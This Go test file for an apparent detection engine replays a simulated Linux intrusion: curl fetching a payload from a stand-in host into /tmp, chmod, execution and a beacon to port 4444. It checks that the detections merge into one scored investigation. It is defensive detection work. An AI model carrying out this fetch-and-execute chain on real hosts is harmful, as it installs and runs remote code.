package tests

import (
	"path/filepath"
	"runtime"
	"testing"

	"sentinelx/backend/correlate"
	"sentinelx/backend/detect"
	"sentinelx/backend/normalize"
	"sentinelx/backend/pipeline"
)

// TestE2E_CurlLolbinChain replays the Linux ingress-tool-transfer + exec-from-tmp
// scenario through the full pipeline (normalize -> graph+detect -> correlate ->
// stores + audit), loading the real /rules directory, and asserts the v1
// acceptance property: four detections collapse into ONE investigation with a
// risk score, technique tags, and an intact evidence chain. The count is 4, not
// 3, because the scenario's C2 callback (port 4444) is itself now caught by the
// broadened ruleset's suspicious_c2_port rule — a real demonstration of the
// wider coverage, not an incidental test artifact.
func TestE2E_CurlLolbinChain(t *testing.T) {
	rulesDir := repoPath(t, "rules")
	rules, err := detect.Load(rulesDir)
	if err != nil {
		t.Fatalf("load rules: %v", err)
	}
	scorer := correlate.NewScorer()
	scorer.CtxMult["T1204.002"] = 1.15
	eng := pipeline.New(rules, scorer)

	const host, boot = "web-01", "b1"
	ns := int64(1_700_000_000_000_000_000)
	tick := func(i int) int64 { return ns + int64(i)*int64(1e9) }

	events := []normalize.AgentEvent{
		{ID: "1", HostID: host, BootID: boot, TSUnixNs: tick(0), Kind: "exec", PID: 100, StartTicks: 100, PPID: 10, ParentStartTicks: 10, Exe: "/bin/bash"},
		{ID: "2", HostID: host, BootID: boot, TSUnixNs: tick(1), Kind: "exec", PID: 101, StartTicks: 101, PPID: 100, ParentStartTicks: 100, Exe: "/usr/bin/curl", Args: "http://203.0.113.5/x -o /tmp/payload"},
		{ID: "3", HostID: host, BootID: boot, TSUnixNs: tick(2), Kind: "net.connect", PID: 101, StartTicks: 101, Exe: "/usr/bin/curl", RAddr: "203.0.113.5", RPort: 80},
		{ID: "4", HostID: host, BootID: boot, TSUnixNs: tick(3), Kind: "file.write", PID: 101, StartTicks: 101, Exe: "/usr/bin/curl", Path: "/tmp/payload"},
		{ID: "5", HostID: host, BootID: boot, TSUnixNs: tick(4), Kind: "exec", PID: 102, StartTicks: 102, PPID: 100, ParentStartTicks: 100, Exe: "/usr/bin/chmod", Args: "+x /tmp/payload"},
		{ID: "6", HostID: host, BootID: boot, TSUnixNs: tick(5), Kind: "exec", PID: 103, StartTicks: 103, PPID: 100, ParentStartTicks: 100, Exe: "/tmp/payload"},
		{ID: "7", HostID: host, BootID: boot, TSUnixNs: tick(6), Kind: "net.connect", PID: 103, StartTicks: 103, Exe: "/tmp/payload", RAddr: "203.0.113.5", RPort: 4444},
	}
	const tenantID = "acme"
	for _, a := range events {
		if _, err := eng.Ingest(tenantID, a); err != nil {
			t.Fatalf("ingest %s: %v", a.ID, err)
		}
	}

	invs := eng.Invs.ListByTenant(tenantID)
	if len(invs) != 1 {
		t.Fatalf("v1 acceptance: want exactly 1 investigation, got %d (alert fatigue not solved)", len(invs))
	}
	inv := invs[0]
	// 5, not 4: the download → execute → beacon graph pattern (download_exec_beacon)
	// now fires on this chain — /tmp/payload was written by curl, then executed and
	// beaconed to :4444 — a cross-event shape the single-event rules cannot express.
	if len(inv.Detections) != 5 {
		t.Fatalf("want 5 detections merged, got %d", len(inv.Detections))
	}
	if inv.RiskScore <= 0 || inv.RiskScore > 100 {
		t.Fatalf("risk score out of range: %d", inv.RiskScore)
	}
	for _, want := range []string{"T1105", "T1222.002", "T1204.002", "T1059.004", "T1571", "T1071"} {
		if !contains(inv.TechniqueSet, want) {
			t.Fatalf("technique %s missing from %v", want, inv.TechniqueSet)
		}
	}
	if len(inv.ScoreFactors) == 0 {
		t.Fatalf("expected auditable score factors")
	}

	st := eng.Stats(tenantID)
	if st.Detections != 5 {
		t.Fatalf("want 5 detections fired, got %d", st.Detections)
	}
	al := eng.AuditLog(tenantID)
	if ok, seq := al.Verify(); !ok {
		t.Fatalf("audit chain broken at seq %d", seq)
	}

	t.Logf("alert-reduction ratio: %d detections -> %d investigation | risk=%d root=%s techniques=%v events=%d audit=%d entries",
		st.Detections, len(invs), inv.RiskScore, inv.RootGUID, inv.TechniqueSet, len(inv.EventIDs), al.Len())
}

func repoPath(t *testing.T, rel string) string {
	t.Helper()
	_, file, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("cannot resolve caller path")
	}
	return filepath.Join(filepath.Dir(file), "..", rel)
}

func contains(ss []string, s string) bool {
	for _, x := range ss {
		if x == s {
			return true
		}
	}
	return false
}
